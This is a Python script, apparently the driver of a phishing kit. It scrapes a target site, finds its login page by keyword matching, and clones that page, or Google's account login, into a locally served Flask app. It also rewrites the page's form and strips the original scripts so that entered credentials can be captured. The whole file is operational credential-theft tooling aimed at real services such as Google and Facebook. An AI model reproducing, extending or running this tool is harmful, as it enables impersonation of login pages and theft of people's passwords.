import os
import clone
import screenshot
import mainhtml
import requests
from bs4 import BeautifulSoup
from termcolor import colored
import implement_backend as backend
from urllib.parse import urlparse
import pickle
import maincss
import subprocess



#Open Keyword files:
cwd = os.getcwd()
folder_path = cwd+ "\\" + "keywords"
link_var = []
input_mail=[]
input_pass=[]
with open(os.path.join(folder_path, "link_keywords"), 'r', encoding='utf-8') as file:
    for line in file:
        link_var.append(line.strip())
with open(os.path.join(folder_path, "mail_keywords"), 'r', encoding='utf-8') as file:
    for line in file:
        input_mail.append(line.strip())
with open(os.path.join(folder_path, "password_keywords"), 'r', encoding='utf-8') as file:
    for line in file:
        input_pass.append(line.strip())
python_file_path =os.path.join(cwd, 'flaskapp.py')

#Linklists
links_with_text = []
check = []
login_link = []
uniquestrings = []
finallinks = []

print("1... Link to website")
print("2... Link to Loginsite")
menu = int(input("Enter Option: "))
url = input("Enter a URL: ")
urlpath = cwd + "\\url"
with open (urlpath ,"w") as file:
    file.write(url)

#Scrape Page:
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
    'Referer': 'https://www.example.com',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',  # Specify accepted encodings
    'Connection': 'keep-alive',  # Keep the connection alive
    'Cache-Control': 'max-age=0',  # Specify caching behavior
    'Upgrade-Insecure-Requests': '1',  # Signal support for upgrading to HTTPS
    'DNT': '1',  # Enable Do Not Track
    'X-Requested-With': 'XMLHttpRequest',  # Indicate AJAX request
    # Add more headers as required
}
result = requests.get(url, headers=headers).text
doc = BeautifulSoup(result, "html.parser")
with open('output.html', 'w', encoding="utf-8") as file:
    file.write(str(doc))


#Functions
def main(url):
    mainhtml.find_links(doc, links_with_text)
    print(colored("Start to clone Loginpage!","blue"))
    clone.download_website(url)
    screenshot.take_screenshot(url, 'screenhot.png')
#check if input field
if menu == 2:
        print(colored("Start to clone Loginpage!","blue"))
        clone.download_website(url)
        screenshot.take_screenshot(url, 'screenhot.png')
        backend.copy_files(urlparse(url).netloc, "index.html")
        backend.implement_form()
        inputlist =[]
        inputnames = []
        
        backend.delete_scripts()
        backend.get_vars_for_flask(inputlist, inputnames)
        with open('data.pkl', 'wb') as f:
            pickle.dump(inputnames, f)
            
        subprocess.run(["python", python_file_path])
else:  
        mainhtml.check_links(links_with_text, link_var, login_link)
        mainhtml.find_links_title(doc, link_var, login_link)
        mainhtml.check_html(login_link, link_var)
        
        if(mainhtml.check_google_login()):
            print(colored("Google Login found", "green"))
            print("url: https://accounts.google.com/")
            clone.download_website("https://accounts.google.com/")
            screenshot.take_screenshot("https://accounts.google.com/", 'screenhot.png')
            backend.copy_files("accounts.google.com", "index.html")
            backend.implement_form()
            inputlist =[]
            inputnames = []
            
            backend.get_vars_for_flask(inputlist, inputnames)
            with open('data.pkl', 'wb') as f:
                pickle.dump(inputnames, f)
            
            subprocess.run(["python", python_file_path])
        elif len(login_link) > 0:
            print(colored("Loginlink found!", "green"))
            mainhtml.buildurl(login_link, url)
            mainhtml.sortlinks(login_link, uniquestrings)
            mainhtml.filter_links(uniquestrings, finallinks)
            
            link = 0
            if len(finallinks) > 0:
                link = finallinks
            else:
                link = uniquestrings
            print("found links:")
            print(colored(link,"yellow"))
            postion= int(input("which link you want to use? "))
            clone.download_website(link[postion-1])
            screenshot.take_screenshot(link[postion-1], 'screenhot.png')
            backend.copy_files(urlparse(link[postion-1]).netloc, "index.html")
            backend.implement_form()
            inputlist =[]
            inputnames = []
            if url == "https://facebook.com":#facebook blocks pass input field
                backend.delete_scripts()
            backend.delete_scripts()
            backend.get_vars_for_flask(inputlist, inputnames)
            with open('data.pkl', 'wb') as f:
                pickle.dump(inputnames, f)
            
            subprocess.run(["python", python_file_path])
        else:
            print(colored("No Loginlink found!", "red"))
            print(colored("Now we let AI do its job!","blue"))
            maincss.main(url)